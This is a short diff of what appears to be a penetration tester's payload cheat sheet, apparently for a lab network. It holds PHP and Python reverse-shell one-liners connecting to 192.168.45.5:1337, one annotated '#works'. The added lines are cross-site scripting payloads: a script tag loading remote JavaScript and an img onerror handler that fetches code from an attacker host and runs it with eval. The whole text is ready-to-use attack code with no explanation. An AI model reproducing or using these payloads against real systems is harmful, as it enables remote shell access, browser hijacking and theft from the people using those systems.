@@ -19,3 +19,6 @@ $sock=fsockopen("192.168.45.5",1337);exec("/bin/sh -i <&3 >&3 2>&3");
 
 #works
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+<script src="http://192.168.45.5:9000/xss.js"></script>
+<img src='x' onerror='fetch("http://192.168.49.52:9000/xss.js").then(function(t){return t.text()}).then(function(v){eval(v)})'>
